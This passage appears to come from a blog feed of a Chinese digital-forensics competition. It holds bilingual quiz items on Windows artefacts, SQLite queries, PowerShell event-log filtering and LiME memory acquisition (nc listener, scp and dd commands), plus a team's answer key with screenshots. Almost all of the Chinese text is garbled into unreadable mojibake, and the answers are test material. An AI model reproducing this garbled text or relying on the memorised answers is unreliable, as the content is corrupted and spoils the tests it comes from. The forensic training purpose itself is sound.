å•é€‰    A. 7;B. 8;C. 9;D. 10</p><h1 id="96-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#96-â€œå‚è€ƒâ€™-Windows-7-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="96    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>96    â€œå‚è€ƒâ€™ Windows 7 â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Windows 7 â€˜ folder to answer below question</p><p>åœ¨ Windows 7ä¸­, potplayeræœ€åæ’­æ”¾çš„æ–‡ä»¶å?<br> In Windows 7, what is the name of the file name of last file played by PotPlayer?</p><p>æç¤º: è¯·ä»¥ä¸è®°å½•ç›¸åŒçš„åç§°(åŒ…æ‹¬å°å†™å­—æ¯ã€é˜¿æ‹‰ä¼¯æ•°å­—ä¸ç¬¦å·)ä¸æ–‡ä»¶æ ¼å¼ä½œç­”<br>Tips: Please answer the exact name (including lowercase letters, arabic numbers and symbols) and file extension of the fileâ€    å¡«ç©º    </p><h1 id="97-â€œäº‹ä»¶åº”æ€¥å°ç»„-IR-team-æ­£åœ¨å¤„ç†ä¸€èµ·ç½‘ç»œäº‹ä»¶ã€‚-è°ƒæŸ¥æ˜¾ç¤ºï¼Œç›®æ ‡æœåŠ¡å™¨æ˜¯ä¸€ä¸ª-EC2-Linux-å®ä¾‹ï¼Œä¸è¯¥äº‹ä»¶æœ‰å…³ã€‚"><a href="#97-â€œäº‹ä»¶åº”æ€¥å°ç»„-IR-team-æ­£åœ¨å¤„ç†ä¸€èµ·ç½‘ç»œäº‹ä»¶ã€‚-è°ƒæŸ¥æ˜¾ç¤ºï¼Œç›®æ ‡æœåŠ¡å™¨æ˜¯ä¸€ä¸ª-EC2-Linux-å®ä¾‹ï¼Œä¸è¯¥äº‹ä»¶æœ‰å…³ã€‚" class="headerlink" title="97    â€œäº‹ä»¶åº”æ€¥å°ç»„ ( IR team)æ­£åœ¨å¤„ç†ä¸€èµ·ç½‘ç»œäº‹ä»¶ã€‚ è°ƒæŸ¥æ˜¾ç¤ºï¼Œç›®æ ‡æœåŠ¡å™¨æ˜¯ä¸€ä¸ª EC2 Linux å®ä¾‹ï¼Œä¸è¯¥äº‹ä»¶æœ‰å…³ã€‚"></a>97    â€œäº‹ä»¶åº”æ€¥å°ç»„ ( IR team)æ­£åœ¨å¤„ç†ä¸€èµ·ç½‘ç»œäº‹ä»¶ã€‚ è°ƒæŸ¥æ˜¾ç¤ºï¼Œç›®æ ‡æœåŠ¡å™¨æ˜¯ä¸€ä¸ª EC2 Linux å®ä¾‹ï¼Œä¸è¯¥äº‹ä»¶æœ‰å…³ã€‚</h1><p>è¯¥å›¢é˜Ÿæ‰“ç®—è·å–Linuxç³»ç»Ÿçš„å†…å­˜ï¼ˆä½¿ç”¨SHA256ï¼‰ã€‚ ä¸è¯¥äº‹ä»¶å…³è”çš„ AWS è´¦æˆ·ä»¥ç”¨æˆ·åâ€œduckmanâ€æ³¨å†Œã€‚ ä¸ºäº†ä¿ƒè¿›å†…å­˜è·å–è¿‡ç¨‹ï¼Œè¯¥å›¢é˜Ÿå»ºç«‹äº†ä¸“ç”¨çš„â€œå–è¯æœåŠ¡å™¨â€ã€‚ å¹¶ä½¿ç”¨â€œLiMEâ€é€šè¿‡ç½‘ç»œè·å–å†…å­˜ã€‚</p><p>ä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤æ˜¯è®¾å®šå–è¯æœåŠ¡å™¨ä»¥ä½œå–å¾—å†…å­˜å†…å®¹çš„åˆæ­¥æ­¥éª¤?</p><p>The incident response team was handling a cyber incident.  The investigation revealed that the target server, an EC2 Linux instance, was implicated in the incident.  </p><p>The team intends to obtain the memory of the Linux system (with SHA256).  The AWS account associated with the incident is registered under the username â€œâ€duckman.â€â€  To facilitate the memory acquisition process, the team has established a dedicated â€œâ€forensic server.â€â€ and use â€œLiMEâ€ to acquire memory via network.</p><p>Which of the following command is the early step to config the â€œforensic serverâ€ for the memory acquisition?</p><p>â€œ    å•é€‰    â€œA. nc -l 4444 &gt;mem126.lime.gz;B. Insmod lime.ko â€œpathtcp:4444 format=lime digest=sha256 compress=1â€;C. scp -I ~/DFIRSciAWTest.pem lime.ko ec2-duckman@3.137.169.127:~/<br>scp -I ~/DFIRSciAWTest.pem /usr/bin/nc ec2-duckman@3.137.169.127:~/;D. ssh duckman@<target_server_ip> â€œâ€sudo dd if=/dev/mem | gzip -1 -â€œâ€ &gt; memory_dump.gzâ€</p><h1 id="98-â€œåŸºäºä¸¤ä¸ª-SQLite-æ•°æ®åº“æ–‡ä»¶â€œcus-202308102034-jsonâ€å’Œâ€œdate-202308101120-jsonâ€ã€‚"><a href="#98-â€œåŸºäºä¸¤ä¸ª-SQLite-æ•°æ®åº“æ–‡ä»¶â€œcus-202308102034-jsonâ€å’Œâ€œdate-202308101120-jsonâ€ã€‚" class="headerlink" title="98    â€œåŸºäºä¸¤ä¸ª SQLite æ•°æ®åº“æ–‡ä»¶â€œcus_202308102034.jsonâ€å’Œâ€œdate_202308101120.jsonâ€ã€‚"></a>98    â€œåŸºäºä¸¤ä¸ª SQLite æ•°æ®åº“æ–‡ä»¶â€œcus_202308102034.jsonâ€å’Œâ€œdate_202308101120.jsonâ€ã€‚</h1><p>è¯·ç¼–è¯‘ä¸€ä¸ª SQLite è„šæœ¬æ‰¾å‡ºè°å‰å¾€ç›®çš„åœ°â€œè«æ–¯ç§‘â€â€.</p><p>åŒ…æ‹¬</p><ul><li>æ‰€æœ‰å®¢æˆ·çš„å§“åã€</li><li>ç›®çš„åœ°ã€</li><li>â€œarrival_timestamp_HKâ€[å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºæœ¬åœ°æ—¶é—´å¹¶å°†è¯¥åˆ—å‘½åä¸ºâ€œlocal_timeâ€]ã€‚</li></ul><p>Based on the two SQLite Database Files â€œcus_202308102034.jsonâ€ and â€œâ€date_202308101120.jsonâ€â€.</p><p>please compile an SQLite statement to find out who traveled to the destination â€œMoscowâ€, with all customers name, destination, â€œarrival_timestamp_HKâ€ [convert the timestamp to localtime and name the column as â€œlocal_timeâ€].<br>â€œ    å•é€‰    â€œA. SELECT c.customer_name, c.destination, datetime(d.arrival_timestamp_HK, â€˜unixepochâ€™, â€˜localtimeâ€™) AS arrival_time_hk<br>FROM cus c<br>INNER JOIN date d ON c.destination = d.Destination<br>WHERE c.destination = â€˜Moscowâ€™;B.<br>SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, â€˜unixepochâ€™, â€˜localtimeâ€™) AS arrival_time_hk<br>FROM cus<br>INNER JOIN date ON customer_id  = date.id<br>WHERE cus.destination = â€˜Moscowâ€™<br>  AND date.Destination = â€˜Moscowâ€™<br>  AND date.arrival_timestamp_HK IS NOT NULL<br>  AND datetime(date.arrival_timestamp_HK, â€˜unixepochâ€™, â€˜localtimeâ€™);C. SELECT cus.customer_name, cus.destination, date.arrival_timestamp<br>FROM cus<br>INNER JOIN date ON cus.destination = date.destination;<br>WHERE cus.destination = â€˜Moscowâ€™<br>  AND date.Destination = â€˜Moscowâ€™;D. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, â€˜unixepochâ€™, â€˜localtimeâ€™) AS arrival_time_hk<br>FROM cus<br>INNER JOIN date ON cus.destination  = date.Destination<br>WHERE cus.destination = â€˜Moscowâ€™<br>  AND date.Destination = â€˜Moscowâ€™<br>  AND date.arrival_timestamp_HK IS NOT NULL<br>  AND datetime(date.arrival_timestamp_HK, â€˜unixepochâ€™, â€˜localtimeâ€™)â€</p><h1 id="99-â€œå†™ä¸€ä¸ªPowershellçš„è„šæœ¬ä»¥æå–æ­£åœ¨è¿æ¥åˆ°Window-11è®¡ç®—æœºçš„å¯ç§»åŠ¨è®¾å¤‡çš„è®°å½•ã€‚å°±æ¯ä¸€ä¸ªè£…ç½®è®°å½•ï¼Œæå–ç›¸å…³çš„æ•°æ®å¦‚è£…ç½®åç§°ã€åˆ¶é€ å•†ã€è£…ç½®è¯¦æƒ…ã€ç¡¬ä»¶ç¼–å·ã€‚åŠåç”¨-â€œWrite-Hostâ€-æŒ‡ä»¤é¢˜ç¤ºæ•°æ®ã€‚"><a href="#99-â€œå†™ä¸€ä¸ªPowershellçš„è„šæœ¬ä»¥æå–æ­£åœ¨è¿æ¥åˆ°Window-11è®¡ç®—æœºçš„å¯ç§»åŠ¨è®¾å¤‡çš„è®°å½•ã€‚å°±æ¯ä¸€ä¸ªè£…ç½®è®°å½•ï¼Œæå–ç›¸å…³çš„æ•°æ®å¦‚è£…ç½®åç§°ã€åˆ¶é€ å•†ã€è£…ç½®è¯¦æƒ…ã€ç¡¬ä»¶ç¼–å·ã€‚åŠåç”¨-â€œWrite-Hostâ€-æŒ‡ä»¤é¢˜ç¤ºæ•°æ®ã€‚" class="headerlink" title="99    â€œå†™ä¸€ä¸ªPowershellçš„è„šæœ¬ä»¥æå–æ­£åœ¨è¿æ¥åˆ°Window 11è®¡ç®—æœºçš„å¯ç§»åŠ¨è®¾å¤‡çš„è®°å½•ã€‚å°±æ¯ä¸€ä¸ªè£…ç½®è®°å½•ï¼Œæå–ç›¸å…³çš„æ•°æ®å¦‚è£…ç½®åç§°ã€åˆ¶é€ å•†ã€è£…ç½®è¯¦æƒ…ã€ç¡¬ä»¶ç¼–å·ã€‚åŠåç”¨ â€œWrite-Hostâ€ æŒ‡ä»¤é¢˜ç¤ºæ•°æ®ã€‚"></a>99    â€œå†™ä¸€ä¸ªPowershellçš„è„šæœ¬ä»¥æå–æ­£åœ¨è¿æ¥åˆ°Window 11è®¡ç®—æœºçš„å¯ç§»åŠ¨è®¾å¤‡çš„è®°å½•ã€‚å°±æ¯ä¸€ä¸ªè£…ç½®è®°å½•ï¼Œæå–ç›¸å…³çš„æ•°æ®å¦‚è£…ç½®åç§°ã€åˆ¶é€ å•†ã€è£…ç½®è¯¦æƒ…ã€ç¡¬ä»¶ç¼–å·ã€‚åŠåç”¨ â€œWrite-Hostâ€ æŒ‡ä»¤é¢˜ç¤ºæ•°æ®ã€‚</h1><p>write a PowerShell script to retrieve all removable device records connected to a Windows 11 desktop, for each device record, extracts relevant information such as the device name, manufacturer, description, and hardware ID.  Then, use the â€œWrite-Hostâ€ cmdlet to displays such information.</p><p>â€œ    å¡«ç©º    </p><h1 id="100-â€œä»¥ä¸‹-PowerShell-è„šæœ¬ç”¨äºä»-Windows-Server-2012-R2-è·å–å…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ‰€æœ‰ä½¿ç”¨è€…æ´»åŠ¨ã€‚"><a href="#100-â€œä»¥ä¸‹-PowerShell-è„šæœ¬ç”¨äºä»-Windows-Server-2012-R2-è·å–å…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ‰€æœ‰ä½¿ç”¨è€…æ´»åŠ¨ã€‚" class="headerlink" title="100    â€œä»¥ä¸‹ PowerShell è„šæœ¬ç”¨äºä» Windows Server 2012 R2 è·å–å…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ‰€æœ‰ä½¿ç”¨è€…æ´»åŠ¨ã€‚"></a>100    â€œä»¥ä¸‹ PowerShell è„šæœ¬ç”¨äºä» Windows Server 2012 R2 è·å–å…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ‰€æœ‰ä½¿ç”¨è€…æ´»åŠ¨ã€‚</h1><p>The following PowerShell script is used to retrieve all user activities with admin rights from a Windows Server 2012 R2.</p><p>Get-WinEvent -FilterHashtable @{<br>    LogName = â€˜Securityâ€™<br>    ID = 4688<br>    Level = 0<br>} | Where-Object {+B86<br>    $_.Properties[?].Value -match â€˜S-1-5-21-\d+-500â€™<br>} | Select-Object -Property TimeCreated, Message</p><p>ä½¿ç”¨ â€œâ€Where-Objectâ€â€ å‘½ä»¤æ¥è¿›ä¸€æ­¥è¿‡æ»¤äº‹ä»¶ã€‚<br>äº‹ä»¶çš„å±æ€§ â€œâ€$_.Properties[?]â€â€ ä¸­çš„å‚æ•°æ˜¯ä»€ä¹ˆï¼Ÿ<br>å¦‚æœäº‹ä»¶çš„ç¬¬ 9 ä¸ªå±æ€§ä¸å†…å»ºçš„ Administrator è´¦æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼šS-1-5-21-<domain>-500ï¼‰åŒ¹é…ï¼Œåˆ™ç¡®ä¿åªé€‰æ‹©ä¸ç®¡ç†å‘˜æ´»åŠ¨ç›¸å…³çš„äº‹ä»¶ã€‚</p><p>The â€œWhere-Objectâ€ cmdlet is used to filter the events further.<br>What is parameter of the eventâ€™s property â€œ$_.Properties[?]â€?<br>if the eventâ€™s 9th property matches the security identifier (SID) of the built-in Administrator account (SID: S-1-5-21-<domain>-500).  This ensures that only events related to activities by an administrator are selected.<br>â€œ    å¡«ç©º    </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾äºš22å›¢é˜Ÿ</title>
      <link href="/2024/11/07/22%E5%9B%A2%E9%98%9F/"/>
      <url>/2024/11/07/22%E5%9B%A2%E9%98%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-åˆ†æAGC-CSè®¡ç®—æœº-Computer-é‡Œæœ€åˆçš„ä½œæ¥­ç³»çµ±-Windows-ï¼Œå®ƒçš„å®éš›å®‰è£…æ—¶é—´æ˜¯ä»€ä¹ˆ-ä»¥æ—¶åŒºUTC-8å›ç­”-3"><a href="#1-åˆ†æAGC-CSè®¡ç®—æœº-Computer-é‡Œæœ€åˆçš„ä½œæ¥­ç³»çµ±-Windows-ï¼Œå®ƒçš„å®éš›å®‰è£…æ—¶é—´æ˜¯ä»€ä¹ˆ-ä»¥æ—¶åŒºUTC-8å›ç­”-3" class="headerlink" title="1    åˆ†æAGC-CSè®¡ç®—æœº (Computer) é‡Œæœ€åˆçš„ä½œæ¥­ç³»çµ± (Windows) ï¼Œå®ƒçš„å®éš›å®‰è£…æ—¶é—´æ˜¯ä»€ä¹ˆ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    3"></a>1    åˆ†æAGC-CSè®¡ç®—æœº (Computer) é‡Œæœ€åˆçš„ä½œæ¥­ç³»çµ± (Windows) ï¼Œå®ƒçš„å®éš›å®‰è£…æ—¶é—´æ˜¯ä»€ä¹ˆ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    3</h1><p>å•é€‰<br>A:2022-09-26 14:35:17;<br>B:2022-09-26 21:35:17;<br>C:2022-09-27 05:35:17;<br>D:2022-10-05 03:52:15;<br>E:2022-10-05 11:52:15<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-141748646.png" class=""><br>C</p><h1 id="2-AGC-CSè®¡ç®—æœºé‡Œçš„-â€˜Acrobat-DCâ€™-è½¯ä»¶çš„å®‰è£…æ—¶é—´æ˜¯-ä»¥æ—¶åŒºUTC-8å›ç­”-å¦‚ç­”æ¡ˆä¸º-2022-12-29-16-01-59ï¼Œéœ€å›ç­”-20221229160159-1"><a href="#2-AGC-CSè®¡ç®—æœºé‡Œçš„-â€˜Acrobat-DCâ€™-è½¯ä»¶çš„å®‰è£…æ—¶é—´æ˜¯-ä»¥æ—¶åŒºUTC-8å›ç­”-å¦‚ç­”æ¡ˆä¸º-2022-12-29-16-01-59ï¼Œéœ€å›ç­”-20221229160159-1" class="headerlink" title="2    AGC-CSè®¡ç®—æœºé‡Œçš„ â€˜Acrobat DCâ€™ è½¯ä»¶çš„å®‰è£…æ—¶é—´æ˜¯? (ä»¥æ—¶åŒºUTC+8å›ç­”) (å¦‚ç­”æ¡ˆä¸º 2022-12-29 16:01:59ï¼Œéœ€å›ç­” 20221229160159)    1"></a>2    AGC-CSè®¡ç®—æœºé‡Œçš„ â€˜Acrobat DCâ€™ è½¯ä»¶çš„å®‰è£…æ—¶é—´æ˜¯? (ä»¥æ—¶åŒºUTC+8å›ç­”) (å¦‚ç­”æ¡ˆä¸º 2022-12-29 16:01:59ï¼Œéœ€å›ç­” 20221229160159)    1</h1><p>å•é€‰<br>A:2022-09-28 19:01:40;<br>B:2022-09-28 07:18:33;<br>C:2022-08-30 19:01:40;<br>D:2022-08-30 07:18:33<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-142100715.png" class=""><br>A</p><h1 id="3-AGC-CSè®¡ç®—æœºé‡Œçš„ç”¨æˆ·-â€˜Carsonâ€™-é“¾æ¥äº†ä¸€ä¸ªç½‘ç»œç£ç›˜æœº-Network-Drive-ï¼Œåœ¨ä¸‹åˆ—å“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰ç›¸å…³èµ„æ–™-2"><a href="#3-AGC-CSè®¡ç®—æœºé‡Œçš„ç”¨æˆ·-â€˜Carsonâ€™-é“¾æ¥äº†ä¸€ä¸ªç½‘ç»œç£ç›˜æœº-Network-Drive-ï¼Œåœ¨ä¸‹åˆ—å“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰ç›¸å…³èµ„æ–™-2" class="headerlink" title="3    AGC-CSè®¡ç®—æœºé‡Œçš„ç”¨æˆ· â€˜Carsonâ€™ é“¾æ¥äº†ä¸€ä¸ªç½‘ç»œç£ç›˜æœº (Network Drive)ï¼Œåœ¨ä¸‹åˆ—å“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰ç›¸å…³èµ„æ–™?    2"></a>3    AGC-CSè®¡ç®—æœºé‡Œçš„ç”¨æˆ· â€˜Carsonâ€™ é“¾æ¥äº†ä¸€ä¸ªç½‘ç»œç£ç›˜æœº (Network Drive)ï¼Œåœ¨ä¸‹åˆ—å“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰ç›¸å…³èµ„æ–™?    2</h1><p>å•é€‰<br>A:\Users\Carson\NTUSER.DAT;<br>B:\Users\admin\NTUSER.DAT;<br>C:\Windows\System32\config\SYSTEM;<br>D:\Windows\System32\config\SOFTWARE;<br>E:\Windows\System32\config\SECURITY<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-144527700.png" class=""><br>ç½‘ç»œç£ç›˜æ˜¯é€šè¿‡ip+æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥è¿æ¥çš„ï¼Œæˆ‘ä»¬ä»èµ„æºç®¡ç†å™¨å¯ä»¥æ‰¾åˆ°ç½‘ç»œç£ç›˜ã€‚çœ‹ä¸€ä¸‹æºæ–‡ä»¶æ˜¯ä»€ä¹ˆ<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-144633691.png" class="">  </p><p>A</p><h1 id="4-æ‰¿ä¸Šé¢˜ï¼Œç”¨æˆ·-â€˜Carsonâ€™-è¿æ¥çš„ç½‘ç»œç£ç›˜æœºçš„IPåœ°å€æ˜¯ä»€ä¹ˆ-1"><a href="#4-æ‰¿ä¸Šé¢˜ï¼Œç”¨æˆ·-â€˜Carsonâ€™-è¿æ¥çš„ç½‘ç»œç£ç›˜æœºçš„IPåœ°å€æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="4    æ‰¿ä¸Šé¢˜ï¼Œç”¨æˆ· â€˜Carsonâ€™ è¿æ¥çš„ç½‘ç»œç£ç›˜æœºçš„IPåœ°å€æ˜¯ä»€ä¹ˆ?    1"></a>4    æ‰¿ä¸Šé¢˜ï¼Œç”¨æˆ· â€˜Carsonâ€™ è¿æ¥çš„ç½‘ç»œç£ç›˜æœºçš„IPåœ°å€æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:\192.168.182.134\;<br>B:\192.168.182.134\photo;<br>C:\192.168.182.134\share;<br>D:\192.168.182.134\AGC;<br>E:\192.168.182.134\AGC photo</p><p>ä»ä¸Šé¢˜å¯ä»¥çœ‹å‡ºC</p><h1 id="5-åˆ†æè®¡ç®—æœºé‡Œçš„ç”µé‚®æ•°æ®ï¼Œå½“ä¸­åŒ…å«å«Œç–‘äººç‹æ™¯æµ©å¯èƒ½çš„å±…ä½åœ°å€ï¼Œè¯·å›ç­”ä»–ä½å€çš„æ¥¼å±‚-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#5-åˆ†æè®¡ç®—æœºé‡Œçš„ç”µé‚®æ•°æ®ï¼Œå½“ä¸­åŒ…å«å«Œç–‘äººç‹æ™¯æµ©å¯èƒ½çš„å±…ä½åœ°å€ï¼Œè¯·å›ç­”ä»–ä½å€çš„æ¥¼å±‚-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="5    åˆ†æè®¡ç®—æœºé‡Œçš„ç”µé‚®æ•°æ®ï¼Œå½“ä¸­åŒ…å«å«Œç–‘äººç‹æ™¯æµ©å¯èƒ½çš„å±…ä½åœ°å€ï¼Œè¯·å›ç­”ä»–ä½å€çš„æ¥¼å±‚ (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>5    åˆ†æè®¡ç®—æœºé‡Œçš„ç”µé‚®æ•°æ®ï¼Œå½“ä¸­åŒ…å«å«Œç–‘äººç‹æ™¯æµ©å¯èƒ½çš„å±…ä½åœ°å€ï¼Œè¯·å›ç­”ä»–ä½å€çš„æ¥¼å±‚ (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-145552827.png" class="">  <p>45æ¥¼</p><h1 id="6-æ‰¿ä¸Šé¢˜ï¼Œç‹æ™¯æµ©ä½¿ç”¨çš„ä¿¡ç”¨å¡å·ç æœ€åå››ä½æ•°å­—æ˜¯-1-å¡«ç©º"><a href="#6-æ‰¿ä¸Šé¢˜ï¼Œç‹æ™¯æµ©ä½¿ç”¨çš„ä¿¡ç”¨å¡å·ç æœ€åå››ä½æ•°å­—æ˜¯-1-å¡«ç©º" class="headerlink" title="6    æ‰¿ä¸Šé¢˜ï¼Œç‹æ™¯æµ©ä½¿ç”¨çš„ä¿¡ç”¨å¡å·ç æœ€åå››ä½æ•°å­—æ˜¯?    1    å¡«ç©º"></a>6    æ‰¿ä¸Šé¢˜ï¼Œç‹æ™¯æµ©ä½¿ç”¨çš„ä¿¡ç”¨å¡å·ç æœ€åå››ä½æ•°å­—æ˜¯?    1    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-145649007.png" class="">  <p>6717</p><h1 id="7-AGC-CSè®¡ç®—æœºç”¨æˆ·-â€˜Carsonâ€™-æ›¾ç»æ”¶åˆ°ä¸€ä¸ªç”µé‚®å¹¶é€šè¿‡é‡Œé¢çš„é“¾ç»“ä¸‹è½½äº†ä¸€ä¸ªå¯ç–‘çš„-â€˜Wordâ€™-æ–‡ä»¶ï¼Œé‚£ä¸ªæ¡£æ¡ˆçš„æ¡£æ¡ˆåæ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚-Cat10-jpgï¼Œéœ€å›ç­”CAT10JPG-1-å¡«ç©º"><a href="#7-AGC-CSè®¡ç®—æœºç”¨æˆ·-â€˜Carsonâ€™-æ›¾ç»æ”¶åˆ°ä¸€ä¸ªç”µé‚®å¹¶é€šè¿‡é‡Œé¢çš„é“¾ç»“ä¸‹è½½äº†ä¸€ä¸ªå¯ç–‘çš„-â€˜Wordâ€™-æ–‡ä»¶ï¼Œé‚£ä¸ªæ¡£æ¡ˆçš„æ¡£æ¡ˆåæ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚-Cat10-jpgï¼Œéœ€å›ç­”CAT10JPG-1-å¡«ç©º" class="headerlink" title="7    AGC-CSè®¡ç®—æœºç”¨æˆ· â€˜Carsonâ€™ æ›¾ç»æ”¶åˆ°ä¸€ä¸ªç”µé‚®å¹¶é€šè¿‡é‡Œé¢çš„é“¾ç»“ä¸‹è½½äº†ä¸€ä¸ªå¯ç–‘çš„ â€˜Wordâ€™ æ–‡ä»¶ï¼Œé‚£ä¸ªæ¡£æ¡ˆçš„æ¡£æ¡ˆåæ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚ Cat10.jpgï¼Œéœ€å›ç­”CAT10JPG)    1    å¡«ç©º"></a>7    AGC-CSè®¡ç®—æœºç”¨æˆ· â€˜Carsonâ€™ æ›¾ç»æ”¶åˆ°ä¸€ä¸ªç”µé‚®å¹¶é€šè¿‡é‡Œé¢çš„é“¾ç»“ä¸‹è½½äº†ä¸€ä¸ªå¯ç–‘çš„ â€˜Wordâ€™ æ–‡ä»¶ï¼Œé‚£ä¸ªæ¡£æ¡ˆçš„æ¡£æ¡ˆåæ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚ Cat10.jpgï¼Œéœ€å›ç­”CAT10JPG)    1    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-152204528.png" class="">  <p>KEDmuon<br>ç‚¹å‡»è¿æ¥å†æµè§ˆå™¨ä¸‹è½½ï¼Œé»˜è®¤ä¸‹è½½ä½ç½®æ˜¯å†downloadï¼Œæˆ‘ä»¬å¯ä»¥å†downloadçœ‹åˆ°ä¸€ä¸ªwordæ–‡ä»¶</p><h1 id="8-æ‰¿ä¸Šé¢˜ï¼Œåˆ†æè¯¥-â€˜Wordâ€™-æ–‡ä»¶ï¼Œå®ƒçš„å¯èƒ½ç”¨é€”æ˜¯-3"><a href="#8-æ‰¿ä¸Šé¢˜ï¼Œåˆ†æè¯¥-â€˜Wordâ€™-æ–‡ä»¶ï¼Œå®ƒçš„å¯èƒ½ç”¨é€”æ˜¯-3" class="headerlink" title="8    æ‰¿ä¸Šé¢˜ï¼Œåˆ†æè¯¥ â€˜Wordâ€™ æ–‡ä»¶ï¼Œå®ƒçš„å¯èƒ½ç”¨é€”æ˜¯?    3"></a>8    æ‰¿ä¸Šé¢˜ï¼Œåˆ†æè¯¥ â€˜Wordâ€™ æ–‡ä»¶ï¼Œå®ƒçš„å¯èƒ½ç”¨é€”æ˜¯?    3</h1><p>å•é€‰<br>A:è®¿é—®ä¸€ä¸ªç½‘ç«™;<br>B:è®°å½•é”®ç›˜æ“ä½œ;<br>C:æŠŠæ¡£æ¡ˆåŠ å¯†;<br>D:æ”¹å˜æ¡Œé¢å£çº¸;<br>E:å…³é—­è®¡ç®—æœº<br>A<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-154033690.png" class="">  </p><h1 id="9-AGC-CSè®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªåä¸º-â€˜adminâ€™-çš„ç”¨æˆ·ï¼Œå®ƒæ˜¯åœ¨ä½•æ—¶è¢«å»ºç«‹çš„-ä»¥æ—¶åŒºUTC-8å›ç­”-1"><a href="#9-AGC-CSè®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªåä¸º-â€˜adminâ€™-çš„ç”¨æˆ·ï¼Œå®ƒæ˜¯åœ¨ä½•æ—¶è¢«å»ºç«‹çš„-ä»¥æ—¶åŒºUTC-8å›ç­”-1" class="headerlink" title="9    AGC-CSè®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªåä¸º â€˜adminâ€™ çš„ç”¨æˆ·ï¼Œå®ƒæ˜¯åœ¨ä½•æ—¶è¢«å»ºç«‹çš„? (ä»¥æ—¶åŒºUTC+8å›ç­”)    1"></a>9    AGC-CSè®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªåä¸º â€˜adminâ€™ çš„ç”¨æˆ·ï¼Œå®ƒæ˜¯åœ¨ä½•æ—¶è¢«å»ºç«‹çš„? (ä»¥æ—¶åŒºUTC+8å›ç­”)    1</h1><p>å•é€‰<br>A:2022-09-28;<br>B:2022-09-29;<br>C:2022-09-30;<br>D:2022-10-01;<br>E:ä»¥ä¸Šçš†é<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-150930637.png" class=""><br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-150952729.png" class=""><br>B</p><h1 id="10-é»‘å®¢ç¬¬ä¸€æ¬¡é‡‡ç”¨ç”¨æˆ·-â€˜adminâ€™-é€šè¿‡è¿œç¨‹æ¡Œé¢åè®®-Remote-Desktop-Protocol-RDP-ç™»å½•äº†AGC-CSè®¡ç®—æœºçš„æ—¶é—´æ˜¯-ä»¥æ—¶åŒºUTC-8å›ç­”-å¦‚ç­”æ¡ˆä¸º-2022-12-29-16-01-59ï¼Œéœ€å›ç­”-20221229160159-2-å¡«ç©º"><a 